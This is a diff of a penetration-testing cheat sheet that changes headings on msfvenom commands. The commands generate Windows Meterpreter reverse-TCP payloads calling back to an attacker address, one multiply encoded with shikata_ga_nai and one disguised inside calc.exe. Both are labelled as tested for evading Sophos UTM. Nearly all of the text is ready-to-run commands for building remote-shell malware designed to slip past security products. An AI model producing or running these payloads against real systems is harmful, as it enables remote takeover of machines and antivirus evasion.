@@ -7,12 +7,12 @@ Examples of previously created MSFVenom payloads required in the different scena
 msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o shell.exe
 ```
 
-##### Encoded multiple times - tested and working:
+##### Evade Sophos UTM - Encoded multiple times - tested and working:
 ```
 msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -e x86/shikata_ga_nai -i 10 -f exe -o shell.exe
 ```
 
-##### Add a Windows Calc.exe as a template:
+##### Evade Sophos UTM - Add Windows Calc.exe as a template - tested and working:
 ```
 msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -f exe -x calc.exe -f exe -o calc-shell.exe
 ```
